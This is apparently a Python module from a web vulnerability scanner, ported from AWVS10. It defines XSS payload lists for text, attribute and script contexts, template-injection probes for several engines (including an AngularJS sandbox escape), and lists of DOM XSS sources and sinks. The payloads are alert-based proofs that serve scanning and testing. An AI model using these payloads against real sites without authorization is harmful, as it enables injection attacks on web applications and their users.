"""
XSS payloads ported from AWVS10 classXSS.inc
Context-aware payloads based on reflection analysis.
"""
import random
import string


def rand_tag():
    return "gk" + "".join(random.choices(string.ascii_lowercase, k=4))


def rand_token():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


PROBE_MARKER = "genkiprobe"

REFLECTION_PROBES = [
    lambda t: f"{t}9{rand_token()}",
    lambda t: f"<{t}>{rand_token()}</{t}>",
    lambda t: f'"{rand_token()}',
    lambda t: f"'{rand_token()}",
]

TEXT_CONTEXT_PAYLOADS = [
    lambda: f"<script>alert('{rand_token()}')</script>",
    lambda: f"<ScRiPt>alert('{rand_token()}')</ScRiPt>",
    lambda: f"<img src=x onerror=alert('{rand_token()}')>",
    lambda: f"<svg onload=alert('{rand_token()}')>",
    lambda: f"<{rand_tag()} id=x tabindex=1 onfocus=alert('{rand_token()}')></{rand_tag()}>",
    lambda: f"<details open ontoggle=alert('{rand_token()}')>",
    lambda: f"<body onload=alert('{rand_token()}')>",
]

ATTR_DOUBLE_QUOTE_PAYLOADS = [
    lambda: f'"><script>alert("{rand_token()}")</script>',
    lambda: f'" autofocus onfocus="alert(\'{rand_token()}\')" x="',
    lambda: f'"><img src=x onerror=alert("{rand_token()}")>',
    lambda: f'"><svg onload=alert("{rand_token()}")>',
]

ATTR_SINGLE_QUOTE_PAYLOADS = [
    lambda: f"'><script>alert('{rand_token()}')</script>",
    lambda: f"' autofocus onfocus='alert(\"{rand_token()}\")' x='",
    lambda: f"'><img src=x onerror=alert('{rand_token()}')>",
]

ATTR_NO_QUOTE_PAYLOADS = [
    lambda: f" onfocus=alert('{rand_token()}') autofocus ",
    lambda: f" onmouseover=alert('{rand_token()}') ",
    lambda: f"><img src=x onerror=alert('{rand_token()}')>",
]

SCRIPT_CONTEXT_PAYLOADS = [
    lambda: f"</script><script>alert('{rand_token()}')</script>",
    lambda: f"'-alert('{rand_token()}')-'",
    lambda: f"\"-alert('{rand_token()}')-\"",
    lambda: f";alert('{rand_token()}');//",
]

TEMPLATE_INJECTION_PAYLOADS = [
    ("angularjs", "{{7*7}}"),
    ("angularjs", "{{constructor.constructor('alert(1)')()}}"),
    ("jinja2", "{{7*'7'}}"),
    ("twig", "{{7*7}}"),
    ("freemarker", "${7*7}"),
    ("erb", "<%= 7*7 %>"),
]

TEMPLATE_EXPECTED = {
    "{{7*7}}": "49",
    "{{7*'7'}}": "7777777",
    "${7*7}": "49",
    "<%= 7*7 %>": "49",
}

DOM_XSS_SOURCES = [
    "document.location",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.location",
    "window.name",
    "location.hash",
    "location.search",
    "location.href",
]

DOM_XSS_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    ".src=",
    ".href=",
    "$.html(",
    ".append(",
]
